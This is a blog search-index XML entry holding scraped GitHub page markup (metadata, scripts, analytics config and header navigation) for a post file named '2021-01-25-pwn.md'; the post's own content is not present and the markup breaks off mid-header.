<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="2021/03/12/2021-01-25-pwn/"/>
      <url>2021/03/12/2021-01-25-pwn/</url>
      
        <content type="html"><![CDATA[<!DOCTYPE html><html lang="en" >  <head>    <meta charset="utf-8">  <link rel="dns-prefetch" href="https://github.githubassets.com">  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">  <link crossorigin="anonymous" media="all" integrity="sha512-/n+kg/Y7wLPWswRTnQ7p4klgJiOIgNxoS9UsKsJGw2mwof0aUh756y7KdN1gMfbOTPt+o1ucHMxxQt6T+/iAwg==" rel="stylesheet" href="https://github.githubassets.com/assets/frameworks-fe7fa483f63bc0b3d6b304539d0ee9e2.css" />  <link crossorigin="anonymous" media="all" integrity="sha512-+k1b7b/MsUroDiQAcg/brRFWwLahsFpuoDCkdBhq8Vjlmzcq5HyiOhczzY+jQfMnf/i7qQKS1e7foF91R6dh4A==" rel="stylesheet" href="https://github.githubassets.com/assets/site-fa4d5bedbfccb14ae80e2400720fdbad.css" />    <link crossorigin="anonymous" media="all" integrity="sha512-z10XGPflnXYB6UOcdRwlX44Wlf/N3KPFQ3EGbql7fxBn7S8fyjyY1OpfD446bs+gHPWXUWVA957mXDmL0xt30A==" rel="stylesheet" href="https://github.githubassets.com/assets/behaviors-cf5d1718f7e59d7601e9439c751c255f.css" />                <link crossorigin="anonymous" media="all" integrity="sha512-tSD1afBYU3wIwXyYDGk9XEHpzh9KNUpufc0Eu+s+8cfiP6TVZUUxEiZci/allIvQfThbqi/CJapWsCf0etmWyA==" rel="stylesheet" href="https://github.githubassets.com/assets/github-b520f569f058537c08c17c980c693d5c.css" />  <script crossorigin="anonymous" defer="defer" integrity="sha512-8K2vvwbW+6H27Nad5ydg8PA2/aMD/LKq+EiK9s0U0hhVZxCI2tWBsYk9beAtisRw2j+Or5k2/F+6dk02nmj/PA==" type="application/javascript" src="https://github.githubassets.com/assets/environment-f0adafbf.js"></script><pre><code>&lt;script crossorigin=&quot;anonymous&quot; defer=&quot;defer&quot; integrity=&quot;sha512-WNhznLW8V61RO/6AS3mIcQ0Ik9+Yfd3gQCqpOCmJCWtjDKt2M2tiYbK0fo6UqPme0uzwu0C1tD67gzwNBtPB8Q==&quot; type=&quot;application/javascript&quot; src=&quot;https://github.githubassets.com/assets/chunk-frameworks-58d8739c.js&quot;&gt;&lt;/script&gt;&lt;script crossorigin=&quot;anonymous&quot; defer=&quot;defer&quot; integrity=&quot;sha512-fZkql5oygGKJNtU8SUVtnpFjUAzTeMaCA/i8zTkH9nuyMDrLtvsDYDYxlFWegsoftVIciba7HsFSOUJQpb4Y+g==&quot; type=&quot;application/javascript&quot; src=&quot;https://github.githubassets.com/assets/chunk-vendor-7d992a97.js&quot;&gt;&lt;/script&gt;</code></pre>  <script crossorigin="anonymous" defer="defer" integrity="sha512-yOqe6phmB+Kv4inuQeHMHG56Y0gmrS9IPjDi5R/JhR7I2/lKjuooneX9hFk/54sanPacXQoi3R72TF21e+ZuxQ==" type="application/javascript" src="https://github.githubassets.com/assets/behaviors-c8ea9eea.js"></script>  <script crossorigin="anonymous" defer="defer" integrity="sha512-IboH9NL3+O+Lawukto6QKYpZo9QXcqLTuYSR6qN9HjTXaD7uqCRQAOUJicPMDeNw/1J9CFaTG1FQjHT/00QnSw==" type="application/javascript" src="https://github.githubassets.com/assets/primer-21ba07f4.js"></script><pre><code>&lt;script crossorigin=&quot;anonymous&quot; defer=&quot;defer&quot; integrity=&quot;sha512-MiuFoXnjDmRNVM/xNR9yfPr8Qi8Q6+TKWIrkXp+1QJv9MW8lpBfOy0u7AuVuXQVYKIhsr5DCuCxIs1STWpujLg==&quot; type=&quot;application/javascript&quot; data-module-id=&quot;./chunk-color-modes.js&quot; data-src=&quot;https://github.githubassets.com/assets/chunk-color-modes-322b85a1.js&quot;&gt;&lt;/script&gt;&lt;script crossorigin=&quot;anonymous&quot; defer=&quot;defer&quot; integrity=&quot;sha512-evfy6RyDyXvLuaEEFaUaIlw9dSRgvKkF3rMeUELkvXq7sGEK/43vTg+3EE6E8nOsjpuPyYQjgS8bxzqkTjlZag==&quot; type=&quot;application/javascript&quot; data-module-id=&quot;./chunk-contributions-spider-graph.js&quot; data-src=&quot;https://github.githubassets.com/assets/chunk-contributions-spider-graph-7af7f2e9.js&quot;&gt;&lt;/script&gt;&lt;script crossorigin=&quot;anonymous&quot; defer=&quot;defer&quot; integrity=&quot;sha512-obMR8mPKx8OvqRe34LgnUcxeJ1qujiA4ND3H6UX13ExMlA/WfHLjEzXRmgGRcRvN/8J1nzc+Z+jgz/PLTFy6zg==&quot; type=&quot;application/javascript&quot; data-module-id=&quot;./chunk-drag-drop.js&quot; data-src=&quot;https://github.githubassets.com/assets/chunk-drag-drop-a1b311f2.js&quot;&gt;&lt;/script&gt;&lt;script crossorigin=&quot;anonymous&quot; defer=&quot;defer&quot; integrity=&quot;sha512-cVnIoXzYnuz2SYwsbnuCpTFzvO17cPoQV2mK82+em//c8i7V2L0VEeInplXGgfbx4d8bQGQuPPx0P0BCRfJ37g==&quot; type=&quot;application/javascript&quot; data-module-id=&quot;./chunk-edit.js&quot; data-src=&quot;https://github.githubassets.com/assets/chunk-edit-7159c8a1.js&quot;&gt;&lt;/script&gt;&lt;script crossorigin=&quot;anonymous&quot; defer=&quot;defer&quot; integrity=&quot;sha512-TGnbT/6B5dxVwEk7iOlwSY9mfqhfq8m05ec+KjdlfEwoieq73iBeyidClQUSmFa2snukwzF9peY8c7FJf9FARA==&quot; type=&quot;application/javascript&quot; data-module-id=&quot;./chunk-emoji-picker-element.js&quot; data-src=&quot;https://github.githubassets.com/assets/chunk-emoji-picker-element-4c69db4f.js&quot;&gt;&lt;/script&gt;&lt;script crossorigin=&quot;anonymous&quot; defer=&quot;defer&quot; integrity=&quot;sha512-NwYkwzxETzKUYRXumHDsBIuggkh86KmJ1WrwWZW5wTvVPf047+wOmOHI5b4D65bfdtd3WbXJ7k+3ZWoxpIaqcA==&quot; type=&quot;application/javascript&quot; data-module-id=&quot;./chunk-insights-graph.js&quot; data-src=&quot;https://github.githubassets.com/assets/chunk-insights-graph-370624c3.js&quot;&gt;&lt;/script&gt;&lt;script crossorigin=&quot;anonymous&quot; defer=&quot;defer&quot; integrity=&quot;sha512-9o5XX7cY3Dx0Aa0/lk35sraT1gbppEY9b+Ka+TUVL0dJMwd0qipbYcqnTWM59JbmH6gsXW97pwg7THIGlgbxNw==&quot; type=&quot;application/javascript&quot; data-module-id=&quot;./chunk-jump-to.js&quot; data-src=&quot;https://github.githubassets.com/assets/chunk-jump-to-f68e575f.js&quot;&gt;&lt;/script&gt;&lt;script crossorigin=&quot;anonymous&quot; defer=&quot;defer&quot; integrity=&quot;sha512-S8aUo+fRvLif3bA63pJ03RyoYVNFJ7Q+aOmtVVHabaVFMwV1zMdE4HTEewMkbU0ZK2Ik5Q3Ob9/JE+zrNC5qaw==&quot; type=&quot;application/javascript&quot; data-module-id=&quot;./chunk-profile-pins-element.js&quot; data-src=&quot;https://github.githubassets.com/assets/chunk-profile-pins-element-4bc694a3.js&quot;&gt;&lt;/script&gt;&lt;script crossorigin=&quot;anonymous&quot; defer=&quot;defer&quot; integrity=&quot;sha512-E+H+wAtjiqutBvn2cnXzDIvmasIhYiS7i7JzOfFUwo+Ej8zT54OrJtP//RhwixnypgOpCF4JvqzYy6zOtORDmg==&quot; type=&quot;application/javascript&quot; data-module-id=&quot;./chunk-runner-groups.js&quot; data-src=&quot;https://github.githubassets.com/assets/chunk-runner-groups-13e1fec0.js&quot;&gt;&lt;/script&gt;&lt;script crossorigin=&quot;anonymous&quot; defer=&quot;defer&quot; integrity=&quot;sha512-0I8dx3vNtOLTKyQ8rOFj0LfLbcfuSVspknSct5t2ySxbhgaoWv++fVRnuopbvjMlBw00ZSN+t8z0KcQuJBneKQ==&quot; type=&quot;application/javascript&quot; data-module-id=&quot;./chunk-sortable-behavior.js&quot; data-src=&quot;https://github.githubassets.com/assets/chunk-sortable-behavior-d08f1dc7.js&quot;&gt;&lt;/script&gt;&lt;script crossorigin=&quot;anonymous&quot; defer=&quot;defer&quot; integrity=&quot;sha512-cAsQOq53AtF8bCPWtKuMXOB2Jjt2089fKQQXtk1bNk2ZSBjx2yQOdGZWsXDfWG5H8FmjJzZsepBmOhy+wO7uAQ==&quot; type=&quot;application/javascript&quot; data-module-id=&quot;./chunk-toast.js&quot; data-src=&quot;https://github.githubassets.com/assets/chunk-toast-700b103a.js&quot;&gt;&lt;/script&gt;&lt;script crossorigin=&quot;anonymous&quot; defer=&quot;defer&quot; integrity=&quot;sha512-UuA5tLVQADGCrCof3JghmrleAvt5HdaObRos/XmYnn9gl4dBj9kZB55hK6EtWGuRXCkNB3oxD7AoGbCKmKmDnw==&quot; type=&quot;application/javascript&quot; data-module-id=&quot;./chunk-tweetsodium.js&quot; data-src=&quot;https://github.githubassets.com/assets/chunk-tweetsodium-52e039b4.js&quot;&gt;&lt;/script&gt;&lt;script crossorigin=&quot;anonymous&quot; defer=&quot;defer&quot; integrity=&quot;sha512-5i3CKyX8LCz1VKZv5JXW1KwoqI61oOSJ/9H5IfgoqQWLsqTPoFIcM8vUcIK/Znc45X6ytfxjyAXvaPpNbFz8dg==&quot; type=&quot;application/javascript&quot; data-module-id=&quot;./chunk-user-status-submit.js&quot; data-src=&quot;https://github.githubassets.com/assets/chunk-user-status-submit-e62dc22b.js&quot;&gt;&lt;/script&gt;</code></pre>  <script crossorigin="anonymous" defer="defer" integrity="sha512-ClYi/CeVdhf93bOkYHrOZHvodWE283+kXVIoZEjgLNb4aX+6RIeuuLnz8Z5SgxKpX4PjW3iiliznS1hFPJjsCA==" type="application/javascript" src="https://github.githubassets.com/assets/repositories-0a5622fc.js"></script><script crossorigin="anonymous" defer="defer" integrity="sha512-sMeb+W2rWQgnrsDvi8Ch12mLeaDygmkOSmvixJzpGF171XKoW22AW2oTNZBwmhRuGBeziTm7HObj/ty3N0s8Iw==" type="application/javascript" src="https://github.githubassets.com/assets/diffs-b0c79bf9.js"></script>  <meta name="viewport" content="width=device-width">    <title>wjddnjs33.github.io/2021-01-25-pwn.md at master · wjddnjs33/wjddnjs33.github.io · GitHub</title>    <meta name="description" content="Contribute to wjddnjs33/wjddnjs33.github.io development by creating an account on GitHub.">    <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="GitHub">  <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">  <meta property="fb:app_id" content="1401488693436528">  <meta name="apple-itunes-app" content="app-id=1477376905" />    <meta name="twitter:image:src" content="https://avatars.githubusercontent.com/u/49112423?s=400&amp;v=4" /><meta name="twitter:site" content="@github" /><meta name="twitter:card" content="summary" /><meta name="twitter:title" content="wjddnjs33/wjddnjs33.github.io" /><meta name="twitter:description" content="Contribute to wjddnjs33/wjddnjs33.github.io development by creating an account on GitHub." />    <meta property="og:image" content="https://avatars.githubusercontent.com/u/49112423?s=400&amp;v=4" /><meta property="og:site_name" content="GitHub" /><meta property="og:type" content="object" /><meta property="og:title" content="wjddnjs33/wjddnjs33.github.io" /><meta property="og:url" content="https://github.com/wjddnjs33/wjddnjs33.github.io" /><meta property="og:description" content="Contribute to wjddnjs33/wjddnjs33.github.io development by creating an account on GitHub." />  <link rel="assets" href="https://github.githubassets.com/">    <meta name="request-id" content="8762:4840:173AAC:1E6CED:604B91C1" data-pjax-transient="true"/><meta name="html-safe-nonce" content="3538f1937ada3ce1bb9bcc4c2429ff781c64f47184356456b3abdeb3c4ee0a38" data-pjax-transient="true"/><meta name="visitor-payload" content="eyJyZWZlcnJlciI6IiIsInJlcXVlc3RfaWQiOiI4NzYyOjQ4NDA6MTczQUFDOjFFNkNFRDo2MDRCOTFDMSIsInZpc2l0b3JfaWQiOiI0MzMxNzg2NTIzMjM1ODE1ODczIiwicmVnaW9uX2VkZ2UiOiJhcC1ub3J0aGVhc3QtMiIsInJlZ2lvbl9yZW5kZXIiOiJhcC1ub3J0aGVhc3QtMiJ9" data-pjax-transient="true"/><meta name="visitor-hmac" content="f8422b6edcfd756ad6584c49d897b480e3200de54458c003bbf22828acbeb797" data-pjax-transient="true"/><pre><code>&lt;meta name=&quot;hovercard-subject-tag&quot; content=&quot;repository:333657172&quot; data-pjax-transient&gt;</code></pre>  <meta name="github-keyboard-shortcuts" content="repository,source-code" data-pjax-transient="true" />  <meta name="selected-link" value="repo_source" data-pjax-transient><pre><code>&lt;meta name=&quot;google-site-verification&quot; content=&quot;c1kuD-K2HIVF635lypcsWPoD4kilo5-jA_wBFyT4uMY&quot;&gt;</code></pre>  <meta name="google-site-verification" content="KT5gs8h0wvaagLKAVWq8bbeNwnZZK1r1XQysX3xurLU">  <meta name="google-site-verification" content="ZzhVyEFwb7w3e0-uOTltm8Jsck2F5StVihD0exw2fsA">  <meta name="google-site-verification" content="GXs5KoUUkNCoaAZn7wPN-t01Pywp9M3sEjnt_3_ZWPc">  <meta name="octolytics-host" content="collector.githubapp.com" /><meta name="octolytics-app-id" content="github" /><meta name="octolytics-event-url" content="https://collector.githubapp.com/github-external/browser_event" />  <meta name="analytics-location" content="/&lt;user-name&gt;/&lt;repo-name&gt;/blob/show" data-pjax-transient="true" />  <meta name="optimizely-datafile" content="{&quot;version&quot;: &quot;4&quot;, &quot;rollouts&quot;: [], &quot;typedAudiences&quot;: [], &quot;anonymizeIP&quot;: true, &quot;projectId&quot;: &quot;16737760170&quot;, &quot;variables&quot;: [], &quot;featureFlags&quot;: [], &quot;experiments&quot;: [], &quot;audiences&quot;: [{&quot;conditions&quot;: &quot;[\&quot;or\&quot;, {\&quot;match\&quot;: \&quot;exact\&quot;, \&quot;name\&quot;: \&quot;$opt_dummy_attribute\&quot;, \&quot;type\&quot;: \&quot;custom_attribute\&quot;, \&quot;value\&quot;: \&quot;$opt_dummy_value\&quot;}]&quot;, &quot;id&quot;: &quot;$opt_dummy_audience&quot;, &quot;name&quot;: &quot;Optimizely-Generated Audience for Backwards Compatibility&quot;}], &quot;groups&quot;: [{&quot;policy&quot;: &quot;random&quot;, &quot;trafficAllocation&quot;: [{&quot;entityId&quot;: &quot;20065350824&quot;, &quot;endOfRange&quot;: 10000}], &quot;experiments&quot;: [{&quot;status&quot;: &quot;Running&quot;, &quot;audienceIds&quot;: [], &quot;variations&quot;: [{&quot;variables&quot;: [], &quot;id&quot;: &quot;20061181493&quot;, &quot;key&quot;: &quot;control&quot;}, {&quot;variables&quot;: [], &quot;id&quot;: &quot;20046091568&quot;, &quot;key&quot;: &quot;most_popular&quot;}], &quot;id&quot;: &quot;20065350824&quot;, &quot;key&quot;: &quot;pricing_page&quot;, &quot;layerId&quot;: &quot;20047761391&quot;, &quot;trafficAllocation&quot;: [{&quot;entityId&quot;: &quot;20061181493&quot;, &quot;endOfRange&quot;: 5000}, {&quot;entityId&quot;: &quot;20046091568&quot;, &quot;endOfRange&quot;: 10000}], &quot;forcedVariations&quot;: {&quot;2022915492.1615428687&quot;: &quot;most_popular&quot;, &quot;1693726779.1607624005&quot;: &quot;most_popular&quot;, &quot;b3d9f4f9910bc46c43a8d65ab83d8570&quot;: &quot;most_popular&quot;, &quot;f7d5ee986ba8bcc155e2393401c920f7&quot;: &quot;most_popular&quot;}}], &quot;id&quot;: &quot;19972601768&quot;}], &quot;attributes&quot;: [{&quot;id&quot;: &quot;16822470375&quot;, &quot;key&quot;: &quot;user_id&quot;}, {&quot;id&quot;: &quot;17143601254&quot;, &quot;key&quot;: &quot;spammy&quot;}, {&quot;id&quot;: &quot;18175660309&quot;, &quot;key&quot;: &quot;organization_plan&quot;}, {&quot;id&quot;: &quot;18813001570&quot;, &quot;key&quot;: &quot;is_logged_in&quot;}, {&quot;id&quot;: &quot;19073851829&quot;, &quot;key&quot;: &quot;geo&quot;}], &quot;botFiltering&quot;: false, &quot;accountId&quot;: &quot;16737760170&quot;, &quot;events&quot;: [{&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;17911811441&quot;, &quot;key&quot;: &quot;hydro_click.dashboard.teacher_toolbox_cta&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18124116703&quot;, &quot;key&quot;: &quot;submit.organizations.complete_sign_up&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18145892387&quot;, &quot;key&quot;: &quot;no_metric.tracked_outside_of_optimizely&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18178755568&quot;, &quot;key&quot;: &quot;click.org_onboarding_checklist.add_repo&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18180553241&quot;, &quot;key&quot;: &quot;submit.repository_imports.create&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18186103728&quot;, &quot;key&quot;: &quot;click.help.learn_more_about_repository_creation&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18188530140&quot;, &quot;key&quot;: &quot;test_event.do_not_use_in_production&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18191963644&quot;, &quot;key&quot;: &quot;click.empty_org_repo_cta.transfer_repository&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18195612788&quot;, &quot;key&quot;: &quot;click.empty_org_repo_cta.import_repository&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18210945499&quot;, &quot;key&quot;: &quot;click.org_onboarding_checklist.invite_members&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18211063248&quot;, &quot;key&quot;: &quot;click.empty_org_repo_cta.create_repository&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18215721889&quot;, &quot;key&quot;: &quot;click.org_onboarding_checklist.update_profile&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18224360785&quot;, &quot;key&quot;: &quot;click.org_onboarding_checklist.dismiss&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18234832286&quot;, &quot;key&quot;: &quot;submit.organization_activation.complete&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18252392383&quot;, &quot;key&quot;: &quot;submit.org_repository.create&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18257551537&quot;, &quot;key&quot;: &quot;submit.org_member_invitation.create&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18259522260&quot;, &quot;key&quot;: &quot;submit.organization_profile.update&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18564603625&quot;, &quot;key&quot;: &quot;view.classroom_select_organization&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18568612016&quot;, &quot;key&quot;: &quot;click.classroom_sign_in_click&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18572592540&quot;, &quot;key&quot;: &quot;view.classroom_name&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18574203855&quot;, &quot;key&quot;: &quot;click.classroom_create_organization&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18582053415&quot;, &quot;key&quot;: &quot;click.classroom_select_organization&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18589463420&quot;, &quot;key&quot;: &quot;click.classroom_create_classroom&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18591323364&quot;, &quot;key&quot;: &quot;click.classroom_create_first_classroom&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18591652321&quot;, &quot;key&quot;: &quot;click.classroom_grant_access&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18607131425&quot;, &quot;key&quot;: &quot;view.classroom_creation&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18831680583&quot;, &quot;key&quot;: &quot;upgrade_account_plan&quot;}, {&quot;experimentIds&quot;: [&quot;20065350824&quot;], &quot;id&quot;: &quot;19064064515&quot;, &quot;key&quot;: &quot;click.signup&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19075373687&quot;, &quot;key&quot;: &quot;click.view_account_billing_page&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19077355841&quot;, &quot;key&quot;: &quot;click.dismiss_signup_prompt&quot;}, {&quot;experimentIds&quot;: [&quot;20065350824&quot;], &quot;id&quot;: &quot;19079713938&quot;, &quot;key&quot;: &quot;click.contact_sales&quot;}, {&quot;experimentIds&quot;: [&quot;20065350824&quot;], &quot;id&quot;: &quot;19120963070&quot;, &quot;key&quot;: &quot;click.compare_account_plans&quot;}, {&quot;experimentIds&quot;: [&quot;20065350824&quot;], &quot;id&quot;: &quot;19151690317&quot;, &quot;key&quot;: &quot;click.upgrade_account_cta&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19424193129&quot;, &quot;key&quot;: &quot;click.open_account_switcher&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19520330825&quot;, &quot;key&quot;: &quot;click.visit_account_profile&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19540970635&quot;, &quot;key&quot;: &quot;click.switch_account_context&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19730198868&quot;, &quot;key&quot;: &quot;submit.homepage_signup&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19820830627&quot;, &quot;key&quot;: &quot;click.homepage_signup&quot;}, {&quot;experimentIds&quot;: [&quot;20065350824&quot;], &quot;id&quot;: &quot;19988571001&quot;, &quot;key&quot;: &quot;click.create_enterprise_trial&quot;}, {&quot;experimentIds&quot;: [&quot;20065350824&quot;], &quot;id&quot;: &quot;20036538294&quot;, &quot;key&quot;: &quot;click.create_organization_team&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20040653299&quot;, &quot;key&quot;: &quot;click.input_enterprise_trial_form&quot;}, {&quot;experimentIds&quot;: [&quot;20065350824&quot;], &quot;id&quot;: &quot;20062030003&quot;, &quot;key&quot;: &quot;click.continue_with_team&quot;}, {&quot;experimentIds&quot;: [&quot;20065350824&quot;], &quot;id&quot;: &quot;20068947153&quot;, &quot;key&quot;: &quot;click.create_organization_free&quot;}], &quot;revision&quot;: &quot;523&quot;}" />  <!-- To prevent page flashing, the optimizely JS needs to be loaded in the    <head> tag before the DOM renders -->  <script crossorigin="anonymous" defer="defer" integrity="sha512-n5ykFkAHsMc4055afmi8V0ptkRim+kEJ3MUNHfrifa/hT4vMCI8E7GcwNMrPyU6A69BP7gxW07fiKxRjWBylSw==" type="application/javascript" src="https://github.githubassets.com/assets/optimizely-9f9ca416.js"></script><pre><code>  &lt;meta name=&quot;hostname&quot; content=&quot;github.com&quot;&gt;&lt;meta name=&quot;user-login&quot; content=&quot;&quot;&gt;  &lt;meta name=&quot;expected-hostname&quot; content=&quot;github.com&quot;&gt;&lt;meta name=&quot;enabled-features&quot; content=&quot;MARKETPLACE_PENDING_INSTALLATIONS,AUTOCOMPLETE_EMOJIS_IN_MARKDOWN_EDITOR&quot;&gt;</code></pre>  <meta http-equiv="x-pjax-version" content="2acd873cfe23803d6cbd8eb05414109c545bf18b6ea94499a5c23de3e8c1780c">  <pre><code>    &lt;link href=&quot;https://github.com/wjddnjs33/wjddnjs33.github.io/commits/master.atom&quot; rel=&quot;alternate&quot; title=&quot;Recent Commits to wjddnjs33.github.io:master&quot; type=&quot;application/atom+xml&quot;&gt;</code></pre>  <meta name="go-import" content="github.com/wjddnjs33/wjddnjs33.github.io git https://github.com/wjddnjs33/wjddnjs33.github.io.git">  <meta name="octolytics-dimension-user_id" content="49112423" /><meta name="octolytics-dimension-user_login" content="wjddnjs33" /><meta name="octolytics-dimension-repository_id" content="333657172" /><meta name="octolytics-dimension-repository_nwo" content="wjddnjs33/wjddnjs33.github.io" /><meta name="octolytics-dimension-repository_public" content="true" /><meta name="octolytics-dimension-repository_is_fork" content="false" /><meta name="octolytics-dimension-repository_network_root_id" content="333657172" /><meta name="octolytics-dimension-repository_network_root_nwo" content="wjddnjs33/wjddnjs33.github.io" /><pre><code>&lt;link rel=&quot;canonical&quot; href=&quot;https://github.com/wjddnjs33/wjddnjs33.github.io/blob/master/backup_md/2021-01-25-pwn.md&quot; data-pjax-transient&gt;</code></pre>  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">  <meta name="browser-optimizely-client-errors-url" content="https://api.github.com/_private/browser/optimizely_client/errors">  <link rel="mask-icon" href="https://github.githubassets.com/pinned-octocat.svg" color="#000000">  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg"><meta name="theme-color" content="#1e2327">  <link rel="manifest" href="/manifest.json" crossOrigin="use-credentials">  </head>  <body class="logged-out env-production page-responsive page-blob" style="word-wrap: break-word;">    <pre><code>&lt;div class=&quot;position-relative js-header-wrapper &quot;&gt;  &lt;a href=&quot;#start-of-content&quot; class=&quot;px-2 py-4 color-bg-info-inverse color-text-white show-on-focus js-skip-to-content&quot;&gt;Skip to content&lt;/a&gt;  &lt;span class=&quot;progress-pjax-loader width-full js-pjax-loader-bar Progress position-fixed&quot;&gt;&lt;span style=&quot;background-color: #79b8ff;width: 0%;&quot; class=&quot;Progress-item progress-pjax-loader-bar &quot;&gt;&lt;/span&gt;</code></pre></span>            <pre><code>        &lt;header class=&quot;Header-old header-logged-out js-details-container Details position-relative f4 py-2&quot; role=&quot;banner&quot;&gt;</code></pre>  <div class="container-xl d-lg-flex flex-items-center p-responsive">    <div class="d-flex flex-justify-between flex-items-center">        <a class="mr-4" href="https://github.com/" aria-label="Homepage" data-ga-click="(Logged out) Header, go to homepage, icon:logo-wordmark">          <svg height="32" class="octicon octicon-mark-github color-text-white" viewBox="0 0 16 16" version="1.1" width="32" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>        </a><pre><code>      &lt;div class=&quot;d-lg-none css-truncate css-truncate-target width-fit p-2&quot;&gt;              &lt;/div&gt;    &lt;div class=&quot;d-flex flex-items-center&quot;&gt;          &lt;a href=&quot;/join?ref_cta=Sign+up&amp;amp;ref_loc=header+logged+out&amp;amp;ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&amp;amp;source=header-repo&quot;            class=&quot;d-inline-block d-lg-none f5 color-text-white no-underline border color-border-tertiary rounded-2 px-2 py-1 mr-3 mr-sm-5 js-signup-redesign-control js-signup-redesign-target&quot;            data-hydro-click=&quot;&#123;&amp;quot;event_type&amp;quot;:&amp;quot;authentication.click&amp;quot;,&amp;quot;payload&amp;quot;:&#123;&amp;quot;location_in_page&amp;quot;:&amp;quot;site header&amp;quot;,&amp;quot;repository_id&amp;quot;:null,&amp;quot;auth_type&amp;quot;:&amp;quot;SIGN_UP&amp;quot;,&amp;quot;originating_url&amp;quot;:&amp;quot;https://github.com/wjddnjs33/wjddnjs33.github.io/blob/master/backup_md/2021-01-25-pwn.md&amp;quot;,&amp;quot;user_id&amp;quot;:null&#125;&#125;&quot; data-hydro-click-hmac=&quot;06a4fd2fe448ce8f961e32cb97536c0b6a353b26cf250e74ae2d8092cb40d5c8&quot;          &gt;            Sign&amp;nbsp;up          &lt;/a&gt;          &lt;a href=&quot;/join_next?ref_cta=Sign+up&amp;amp;ref_loc=header+logged+out&amp;amp;ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&amp;amp;source=header-repo&quot;            class=&quot;d-inline-block d-lg-none f5 color-text-white no-underline border color-border-tertiary rounded-2 px-2 py-1 mr-3 mr-sm-5 js-signup-redesign-variation js-signup-redesign-target&quot;            hidden            data-hydro-click=&quot;&#123;&amp;quot;event_type&amp;quot;:&amp;quot;authentication.click&amp;quot;,&amp;quot;payload&amp;quot;:&#123;&amp;quot;location_in_page&amp;quot;:&amp;quot;site header&amp;quot;,&amp;quot;repository_id&amp;quot;:null,&amp;quot;auth_type&amp;quot;:&amp;quot;SIGN_UP&amp;quot;,&amp;quot;originating_url&amp;quot;:&amp;quot;https://github.com/wjddnjs33/wjddnjs33.github.io/blob/master/backup_md/2021-01-25-pwn.md&amp;quot;,&amp;quot;user_id&amp;quot;:null&#125;&#125;&quot; data-hydro-click-hmac=&quot;06a4fd2fe448ce8f961e32cb97536c0b6a353b26cf250e74ae2d8092cb40d5c8&quot;          &gt;            Sign&amp;nbsp;up          &lt;/a&gt;      &lt;button class=&quot;btn-link d-lg-none mt-1 js-details-target&quot; type=&quot;button&quot; aria-label=&quot;Toggle navigation&quot; 